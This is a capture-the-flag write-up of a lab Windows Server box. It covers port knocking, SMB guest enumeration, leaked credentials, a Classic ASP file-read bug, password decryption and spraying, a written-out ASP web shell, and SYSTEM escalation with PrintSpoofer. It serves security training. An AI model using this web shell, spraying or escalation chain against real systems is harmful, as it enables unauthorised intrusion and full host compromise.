# B2R Knockdown Solution

Challenge: Knockdown

Difficulty: Hard

# Recon

```
$ nmap -sC -sV -p 80,7000,8000,9000,10000 192.168.203.141
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 22:35 -0500
Nmap scan report for 192.168.203.141
Host is up (0.00088s latency).

PORT      STATE SERVICE           VERSION
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
7000/tcp  open  afs3-fileserver?
8000/tcp  open  napster           WinMX or Lopster Napster P2P client
9000/tcp  open  cslistener?
10000/tcp open  snet-sensor-mgmt?
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7000-TCP:V=7.98%I=7%D=3/1%Time=69A50588%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2,"3\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9000-TCP:V=7.98%I=7%D=3/1%Time=69A50588%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2,"2\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10000-TCP:V=7.98%I=7%D=3/1%Time=69A50588%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2,"4\n");
MAC Address: 00:0C:29:93:80:28 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.58 seconds
```

Like most B2R boxes, we start off with port scanning. The nmap result above shows us that we have the typical 80/http port open (leads to nowhere), and 4 other ports running unknown services. When nmap finds unrecognized services, it would send NULL probes to see what the server expects (via the error codes or in this case, the fingerprintining). The output only shows numbers in ascending order, like a sequence, likely telling us which port in which sequence. This is referred to as "Port Knocking". Its a cool concept of security through obscurity, but its largely impractical in the real world.
We'll give the port knocking a try:

``` $ knock 192.168.203.141 8000 9000 7000 10000 # knock the ports in these sequences according to the service fingerprint ```

Now, if we perform another nmap scan, we should be able to see more. This is sorta like a "knock on the door passcode" to tell the server to do something. In this case, it is opening more ports to services.

```
$ nmap -sC -sV -p- -Pn 192.168.203.141 --min-rate 2000
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-01 22:45 -0500
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.27% done; ETC: 22:47 (0:01:17 remaining)
Stats: 0:00:56 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 84.92% done; ETC: 22:46 (0:00:10 remaining)
Stats: 0:01:22 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 60.00% done; ETC: 22:47 (0:00:11 remaining)
Nmap scan report for 192.168.203.141
Host is up (0.00076s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH for_Windows_9.2 (protocol 2.0)
| ssh-hostkey: 
|   256 58:09:68:62:33:50:1a:6b:4f:c2:33:68:64:44:57:59 (ECDSA)
|_  256 82:8b:0f:4a:2f:87:6b:e6:59:00:e5:db:3a:d3:7c:8f (ED25519)
80/tcp    open  http              Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds      Windows Server 2019 Standard 17763 microsoft-ds
7000/tcp  open  afs3-fileserver?
8000/tcp  open  napster           WinMX or Lopster Napster P2P client
9000/tcp  open  cslistener?
10000/tcp open  snet-sensor-mgmt?
49664/tcp open  msrpc             Microsoft Windows RPC
49665/tcp open  msrpc             Microsoft Windows RPC
49666/tcp open  msrpc             Microsoft Windows RPC
49667/tcp open  msrpc             Microsoft Windows RPC
49668/tcp open  msrpc             Microsoft Windows RPC
49670/tcp open  msrpc             Microsoft Windows RPC
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port7000-TCP:V=7.98%I=7%D=3/1%Time=69A50829%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2,"3\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9000-TCP:V=7.98%I=7%D=3/1%Time=69A50829%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2,"2\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port10000-TCP:V=7.98%I=7%D=3/1%Time=69A50829%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2,"4\n");
MAC Address: 00:0C:29:93:80:28 (VMware)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: WIN-SJR239VHPGG
|   NetBIOS computer name: WIN-SJR239VHPGG\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-03-02T11:47:44+08:00
|_clock-skew: mean: -2h39m59s, deviation: 4h37m07s, median: 0s
|_nbstat: NetBIOS name: WIN-SJR239VHPGG, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:93:80:28 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-02T03:47:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.75 seconds
```

We clearly see more ports open now, and we can proceed to cracking this box open.
First, I want to see if I can do null auth on SMB:
```
$ smbmap -H 192.168.203.141 -u Guest -p ""             

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 192.168.203.141:445     Name: staff.0nyx.void           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        archive                                                 NO ACCESS
        C$                                                      NO ACCESS       Default share
        Comms                                                   READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        Loot_Drop                                               READ ONLY
        Tools                                                   READ ONLY
[*] Closed 1 connections
```

I was able to authenticate and connect to SMB via the Guest account with no password. With this, I could see some SMB shares which I had access to (READ ONLY permissions).
Since we have access to these shares, we'll skim through them to see if we can find anything interesting. 

# Information Disclosure

I'll skip to the actually important bits here because a whole bunch of the files here are filler/red herring, and it took me hours to proceed:

```
$ smbclient //192.168.203.141/Loot_Drop -U 'Guest%' -c 'get Backups/Server_Logs/Recent/System_Dumps/sys_recovery_p_99.log /tmp/sys_recovery_p_99.log'
getting file \Backups\Server_Logs\Recent\System_Dumps\sys_recovery_p_99.log of size 423 as /tmp/sys_recovery_p_99.log (103.3 KiloBytes/sec) (average 103.3 KiloBytes/sec)

$ cat /tmp/sys_recovery_p_99.log                                                            
[SYSTEM_RECOVERY_PROTOCOL]
[TIMESTAMP: 2025-12-23T04:00:00Z]
[USER: SYSTEM]

WARNING: Stealth Mode Active.
External Access via SSH/SMB denied by firewall ruleset '0nyx_Lockdown'.

RECOVERY INSTRUCTIONS:
To regain access to the control node, execute the Port Knock sequence.
Sequence:
  1. TCP 8000
  2. TCP 9000
  3. TCP 7000
  4. TCP 10000

Credentials 
User: crYp7
Pass: h@ck1ngCYNX1sfUn

END OF LOG.
```
We have the credentials here for user `crYp7`. I went and tried to see if I could get more of the local user accounts: 

```
$ impacket-lookupsid Guest@192.168.203.141 -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.203.141
[*] StringBinding ncacn_np:192.168.203.141[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-730879702-844948771-66853788
500: WIN-SJR239VHPGG\Administrator (SidTypeUser)
501: WIN-SJR239VHPGG\Guest (SidTypeUser)
503: WIN-SJR239VHPGG\DefaultAccount (SidTypeUser)
504: WIN-SJR239VHPGG\WDAGUtilityAccount (SidTypeUser)
513: WIN-SJR239VHPGG\None (SidTypeGroup)
1000: WIN-SJR239VHPGG\r007 (SidTypeUser)
1001: WIN-SJR239VHPGG\crYp7 (SidTypeUser)
1002: WIN-SJR239VHPGG\backup-svc (SidTypeUser)
```

We got some user accounts, which we'll add to users.txt for spraying later (or our own reference).

# Initial Foothold

Since `crYp7` is a real user account, I'll attempt to perform an SSH authentication using these credentials:

```
$ ssh crYp7@192.168.203.141
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
crYp7@192.168.203.141's password: h@ck1ngCYNX1sfUn

Microsoft Windows [Version 10.0.17763.107]           
(c) 2018 Microsoft Corporation. All rights reserved. 
                                                     
cryp7@WIN-SJR239VHPGG C:\Users\cryp7>  
```

We are able to get an SSH connection! Now to check for what permissions I have:

```
cryp7@WIN-SJR239VHPGG C:\Users\cryp7> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Not many permissions, so we likely have to pivot to another account or service since there's no permissions here to escalate privileges either. Now (unfortunately), there's more file enumeration and digging to do, but eventually, we can see the `heads_up.txt`, and we can get to `C:\Syndicate_Loot\` where we can see a few things of note.

```
cryp7@WIN-SJR239VHPGG C:\Users\cryp7>type C:\Users\cryp7\Desktop\heads_up.txt 
hey im backed up by the engagements im handling. help me set up my computer here okay. 
I usually encrypt my passwords using PassEncrypt.exe, i put it in C:\Syndicate_Loot for you to refer.
I also put hmm.txt in there as an example. do promise me dont break anything ok
-r007
```

`\archive` is a restricted directory, and we don't have the permissions to view it as user crYp7. As such, we need to get creative with our approach. I routed my traffic through an SSH tunnel:

```
$ ssh -N -L 18080:127.0.0.1:8080 crYp7@192.168.203.141
```

Then I tried to access the internal web server:

```
$ gobuster dir -u http://127.0.0.1:18080/ -w /usr/share/wordlists/dirb/common.txt -x asp,txt,config

===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://127.0.0.1:18080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              asp,txt,config
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
assets               (Status: 301) [Size: 153] [--> http://127.0.0.1:18080/assets/]
includes             (Status: 301) [Size: 155] [--> http://127.0.0.1:18080/includes/]
index.asp            (Status: 200) [Size: 3462]
Index.asp            (Status: 200) [Size: 3462]
notes                (Status: 301) [Size: 152] [--> http://127.0.0.1:18080/notes/]
Pages                (Status: 301) [Size: 152] [--> http://127.0.0.1:18080/Pages/]
pages                (Status: 301) [Size: 152] [--> http://127.0.0.1:18080/pages/]
Progress: 18452 / 18452 (100.00%)
===============================================================
Finished
===============================================================
```

We can read the `notes.asp`, therefore, we'll see if there's a vulnerability here:

```
$ curl -sG 'http://127.0.0.1:18080/pages/notes/notes.asp?x=C:\inetpub\draft\pages\notes\notes.asp'                

<%
Dim fso, file, path
path = Request.QueryString("x")

Set fso = Server.CreateObject("Scripting.FileSystemObject")

If path <> "" And fso.FileExists(path) Then
    Set file = fso.OpenTextFile(path, 1, False)

    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.LoadFromFile path

    Response.ContentType = "application/octet-stream"
    Response.AddHeader "Content-Disposition", "attachment; filename=" & fso.GetFileName(path)
    Response.BinaryWrite stream.Read

    stream.Close
    Set stream = Nothing
Else
    Response.Write "File not found."
End If

Set file = Nothing
Set fso = Nothing
%>
...
[truncated]
```

This gives us arbitrary file read/path traversal. We can then use this to query files we normally don't have access to, for instance, the `C:\Syndicate_Loot\archive\hmm.txt` that was previously mentioned:

```
$ curl -sG 'http://127.0.0.1:18080/pages/notes/notes.asp?x=C:\Syndicate_Loot\archive\hmm.txt'
found a file on a recent engagement that may be interesting
vjmJn+Csvc5hci06zhdxMH9KOXGxr7v43KUsI7EHcLOt+Ci0vGlT4RlMbdleJvbv
```

Since it's encrypted, we'll also get the `PassEncrypt.exe`:

```
$ curl -s 'http://127.0.0.1:18080/pages/notes/notes.asp?x=C:\Syndicate_Loot\archive\PassEncrypt.exe' -o PassEncrypt.exe
```

Reverse engineer the exe (or just chuck it into an AI) to tell you how it functions, so you can use it to decrypt the `vjmJn+Csvc5hci06zhdxMH9KOXGxr7v43KUsI7EHcLOt+Ci0vGlT4RlMbdleJvbv`. It's just AES + XOR. 

```
AES Key: cryptNrootRockss
XOR Key: PeanutButterAndChocolateWaffles
```

Then, decrypt the string to get the password left by r007:

```
import base64
from Crypto.Cipher import AES

b64 = 'vjmJn+Csvc5hci06zhdxMH9KOXGxr7v43KUsI7EHcLOt+Ci0vGlT4RlMbdleJvbv'
raw = base64.b64decode(b64)

xor_key = b'PeanutButterAndChocolateWaffles'
aes_key = b'cryptNrootRockss'
iv = b'\x00'*16

x = bytes(b ^ xor_key[i % len(xor_key)] for i,b in enumerate(raw))
pt = AES.new(aes_key, AES.MODE_CBC, iv).decrypt(x)
print(pt[:-pt[-1]].decode())
```

And we'll get our output:

```
$ python decode.py
Cant live without morning coffee!!
```

# Lateral Movement

So, `Cant live without morning coffee!!` is our password. We'll use it to spray against our list of users from earlier (output of impacket-lookupsid):

```
$ netexec smb 192.168.203.141 -u users.txt -p 'Cant live without morning coffee!!' --local-auth
SMB         192.168.203.141 445    WIN-SJR239VHPGG  [*] Windows Server 2019 Standard 17763 x64 (name:WIN-SJR239VHPGG) (domain:WIN-SJR239VHPGG) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\r007:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\crYp7:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\Administrator:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
SMB         192.168.203.141 445    WIN-SJR239VHPGG  [-] WIN-SJR239VHPGG\Guest:Cant live without morning coffee!! STATUS_LOGON_FAILURE 
SMB         192.168.203.141 445    WIN-SJR239VHPGG  [+] WIN-SJR239VHPGG\backup-svc:Cant live without morning coffee!!
```

Successful login on `backup-svc`!! Now, we'll try to authenticate

```
$ ssh backup-svc@192.168.203.141
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
backup-svc@192.168.203.141's password: Cant live without morning coffee!!
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

backup-svc@WIN-SJR239VHPGG C:\Users\backup-svc>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

backup-svc@WIN-SJR239VHPGG C:\Users\backup-svc>whoami
win-sjr239vhpgg\backup-svc
```

Not enough permissions, so I will try use the same SSH tunnel from earlier:

```
ssh -N -L 18080:127.0.0.1:8080 backup-svc@192.168.203.141
```

Additionally, if we probe the site, we'll get the following:

```
$ curl 127.0.0.1:18080/flag.asp
[truncated]
<div class="content-container"> 
 <fieldset><h4>Detailed Error Information:</h4> 
  <div id="details-left"> 
   <table border="0" cellpadding="0" cellspacing="0"> 
    <tr class="alt"><th>Module</th><td>&nbsp;&nbsp;&nbsp;IIS Web Core</td></tr> 
    <tr><th>Notification</th><td>&nbsp;&nbsp;&nbsp;MapRequestHandler</td></tr> 
    <tr class="alt"><th>Handler</th><td>&nbsp;&nbsp;&nbsp;ASPClassic</td></tr> 
    <tr><th>Error Code</th><td>&nbsp;&nbsp;&nbsp;0x80070002</td></tr> 
[truncated]
```
So we know that the site uses a Classic ASP Handler, which means it will parse ASP files that are dropped into it. If we can write ASP files to `/inetpub`, then we can get it to run.
So, we'll upload the following command as an ASP file (because user backup-svc has write priv to /inetpub) to get a web shell:

```
$ cat upload.asp
<%
Response.Buffer = True
Dim cmd, sh, ex, out
cmd = Request.QueryString("c")
If cmd = "" Then
  Response.Write "usage:?c=command"
Else
  Set sh = Server.CreateObject("WScript.Shell")
  Set ex = sh.Exec("cmd /c " & cmd)
  out = ex.StdOut.ReadAll() & ex.StdErr.ReadAll()
  Response.Write "<pre>" & Server.HTMLEncode(out) & "</pre>"
End If
%>

$ scp upload.asp backup-svc@192.168.203.141:/C:/inetpub/draft/upload.asp
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
backup-svc@192.168.203.141's password: 
upload.asp                                                                                                                                                         100%  341   210.7KB/s   00:00 
```

Now to check whether we have RCE as `iis apppool\draft`:

```
$ curl -s 'http://127.0.0.1:18080/upload.asp?c=whoami'                     

<pre>iis apppool\draft
</pre>

$ curl -s 'http://127.0.0.1:18080/upload.asp?c=whoami%20/priv'

<pre>
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</pre>
```

We still won't be able to read `C:\Users\Administrator\Desktop\flag.txt` because we're not a local admin (yet). To do so, we'll need to escalate our privilege. We can do so easily because `SeImpersonatePrivilege` is enabled, so we can use PrintSpoofer.

# Privilege Escalation

We'll download, then upload/scp to the target:

```
$ wget -q https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer64.exe

$ scp PrintSpoofer64.exe backup-svc@192.168.203.141:/C:/inetpub/draft/PrintSpoofer64.exe
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
backup-svc@192.168.203.141's password: 
PrintSpoofer64.exe                                                                                                                                                 100%   27KB   2.9MB/s   00:00 
```

Then, execute the command:

```
$ curl -s "http://127.0.0.1:18080/upload.asp?c=%22C:\inetpub\draft\PrintSpoofer64.exe%22+-i+-c+whoami"
<pre>[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
nt authority\system
</pre>
```

Now we have SYSTEM-level privilege with impersonated pipe. We can now read the flag:

```
$ curl -s "http://127.0.0.1:18080/upload.asp?c=C:\inetpub\draft\PrintSpoofer64.exe+-i+-c+%22cmd.exe+/c+type+C:\Users\Administrator\Desktop\flag.txt%22"
<pre>[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
CYNX{wh0_0wn_wh0_n0w?}</pre>
```

# Flag

The final flag is `CYNX{wh0_0wn_wh0_n0w?}`
